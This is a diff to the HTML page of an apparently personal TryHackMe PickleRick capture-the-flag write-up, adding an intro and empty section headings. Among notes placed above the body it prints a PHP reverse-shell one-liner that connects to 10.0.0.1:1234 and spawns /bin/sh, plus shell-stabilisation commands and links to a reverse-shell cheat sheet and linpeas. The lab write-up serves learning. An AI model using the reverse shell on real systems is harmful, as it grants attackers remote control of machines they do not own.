@@ -21,7 +21,17 @@
 	</head>
 
 
-
+			<img src="../../../pages/TryHackMe/HeartBleed/img/4.png" alt="!Finding The Flag File!">
+			<p> <code>while read line; do echo $line; done < clue.txt </code> </p>
+			<p> <code>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</code> </p>
+			<p> tty hell escape </p>
+			<p> <code> python3 -c 'import pty;pty.spawn("/bin/bash")'</code> </p>
+			<p> <code>export TERM=xterm </code> </p>
+			<p> <keyboard> Ctrl + Z</keyboard> </p>
+			<p> <code> stty raw -echo; fg</code> </p>
+			<p>Link: <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+			<p>Link: <a href="https://medium.com/@varunrajamirtharaj/stabilizing-a-shell-getting-a-fully-functional-tty-31232897f2f5">https://medium.com/@varunrajamirtharaj/stabilizing-a-shell-getting-a-fully-functional-tty-31232897f2f5</a></p>
+			<p>Link: <a href="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh">https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh</a></p>
 
 
     <body>
@@ -31,7 +41,21 @@
 			<p>Try Hack Me Link: <a href="https://tryhackme.com/r/room/picklerick">https://tryhackme.com/r/room/picklerick</a></p>
 			<p>Completed: 2025-03-10</p>
 			<p>*Formatting warning! If you are new and are following along I put things that need to be replaced with your information in such format. [replace me!] Anything within them needs to be replaced and the []'s do not get put in the command!*</p>
-
+			<h2>Intro</h2>
+			<p>Hello! This is my second writeup! Today I am going to be walking you through how I solved the PickleRick TryHackMe Room. If you want to get to knwo more about me, feel free to go to the About Me section of my main page! I am goign to give you a head up for thoes of you who notice my IP addresses keep changing thoughout my screen shots. That is because when I was solving this room I managed to crash the server muktiple times, snd each time you reeboot the room the IP address changes. So that is a learning lesson for you to learn off of my mistakes, when executing shells becarful, because shells are unpredictable and can sometimes crash the system they are being ran on.</p>
+			<h2>Room</h2>
+			
+			<h2>Enumerating</h2>
+			
+			<h2>Exploitation</h2>
+			
+			<h2>Finding The First Ingredient!</h2>
+			
+			<h2>Privilage Escilation</h2>
+			
+			<h2>Finding The Second Ingredient!</h2>
+			
+			<h2>Finding The Third Ingredent!</h2>
 		</main>
 	</body>
 </html>
